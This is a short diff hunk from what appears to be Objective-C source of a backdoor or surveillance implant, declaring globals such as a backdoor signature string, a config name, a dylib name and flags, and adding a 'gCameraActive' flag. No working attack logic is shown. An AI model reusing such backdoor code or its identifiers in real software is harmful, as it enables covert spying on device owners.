@@ -57,6 +57,7 @@ char gBackdoorSignature[]       = "MPMxXyD6fUfaWaIOia4X+koq7BtXXj3o"; // Dubai
 char gConfName[]    = "c3mdX053du1YJ541vqWILrc4Ff71pViL";
 
 BOOL gAgentCrisis   = NO;
+BOOL gCameraActive  = NO;
 
 NSString *gDylibName                = nil;
 NSString *gBackdoorName             = nil;
